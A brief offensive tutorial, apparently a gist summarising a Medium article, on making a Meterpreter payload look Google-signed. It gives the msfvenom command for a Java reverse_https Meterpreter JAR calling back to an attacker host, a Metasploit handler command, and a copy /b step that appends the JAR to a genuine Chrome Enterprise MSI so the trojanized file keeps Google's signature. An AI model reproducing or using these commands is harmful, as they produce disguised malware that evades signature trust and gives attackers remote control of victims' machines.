# Making-Meterpreter-Look-Google-Signed  
https://medium.com/forensicitguy/making-meterpreter-look-google-signed-using-msi-jar-files-c0a7970ff8b7  
  
1) Create malicious java  
msfvenom -p java/meterpreter/reverse_https LHOST=<metasploit host> -f jar -o meterpreter-https.jar  
  
2) Using metasploit for create handler  
msf> handler -p java/meterpreter/reverse_https -H 0.0.0.0 -P 8443
  
3) Create copy from Google Chrome Enterprise MSI  
copy /b GoogleChromeStandaloneEnterprise64.msi + meterpreter-https.jar GoogleChromeStandaloneEnterprise64.jar  
  
After all, We will got the new file in Google Installer file.  
